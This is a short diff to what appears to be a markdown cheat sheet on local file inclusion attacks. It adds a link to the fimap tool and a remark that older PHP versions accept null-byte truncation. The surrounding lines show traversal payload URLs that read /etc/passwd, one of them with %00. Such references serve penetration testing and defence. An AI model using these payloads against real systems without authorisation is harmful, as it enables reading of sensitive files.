@@ -33,6 +33,7 @@
 
 * [Kadimus - https://github.com/P0cL4bs/Kadimus](https://github.com/P0cL4bs/Kadimus)
 * [LFISuite - https://github.com/D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite)
+* [fimap - https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)
 
 ## Basic LFI
 
@@ -43,6 +44,8 @@ http://example.com/index.php?page=../../../etc/passwd
 ```
 
 ### Null byte
+
+:warning: In versions of PHP below 5.3 we can terminate with null byte.
 
 ```powershell
 http://example.com/index.php?page=../../../etc/passwd%00
